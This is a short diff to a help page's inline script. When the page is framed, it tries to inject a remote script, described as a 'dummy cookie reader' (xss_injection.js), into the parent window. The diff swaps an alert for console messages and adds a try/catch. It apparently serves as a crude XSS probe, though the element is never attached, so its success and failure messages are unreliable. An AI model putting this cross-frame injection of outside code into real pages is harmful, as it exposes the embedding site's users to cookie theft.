@@ -17,9 +17,14 @@
         </div>
         <script>
             if(window.top !== window){
-                alert("The script is manipulating the DOM above itself!");
-                var sc = window.top.document.createElement("script");
-                sc.src = "https://noahgwood.github.io/WebHelp/js/xss_injection.js"
+                console.log("The script is manipulating the DOM above itself!");
+                console.log("This indicates that your website is potentially vulnerable to XSS\nAttempting to inject dummy cookie reader to root window.")
+                try {
+                    var sc = window.top.document.createElement("script");
+                    sc.src = "https://noahgwood.github.io/WebHelp/js/xss_injection.js"                
+                } catch (error) {
+                    console.log("Browser succesfully prevented XSS injection.");
+                }
             }
         </script>
         <include-element src="../partials/footer.html"></include-element>
